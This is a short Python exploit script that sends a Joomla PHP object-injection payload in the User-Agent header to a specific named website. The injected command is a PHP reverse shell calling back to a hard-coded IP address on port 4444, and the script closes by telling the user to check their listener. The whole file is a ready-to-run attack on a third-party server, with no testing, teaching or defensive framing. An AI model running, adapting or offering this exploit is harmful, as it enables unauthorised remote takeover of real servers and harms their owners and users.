import requests

target = "https://archive.bff.com.bd/index.php"
payload = (
    '"}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";'
    'O:17:"JSimplepieFactory":0:{}s:21:"disconnectHandlers";'
    'a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";'
    'O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;'
    's:19:"cache_name_function";s:6:"assert";'
    's:10:"javascript";i:9999;s:8:"feed_url";s:{len_cmd}:"{cmd}";}'
    'i:1;s:4:"init";}}}'
)

cmd = "php -r '\$sock=fsockopen(\"34.87.30.210\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"  # Reverse shell
payload_filled = payload.replace("{len_cmd}", str(len(cmd))).replace("{cmd}", cmd)

headers = {
    "User-Agent": payload_filled,
    "Referer": target,
    "Content-Type": "application/x-www-form-urlencoded",
}

response = requests.get(target, headers=headers, verify=False)
print(f"Exploit sent. Check your listener!")
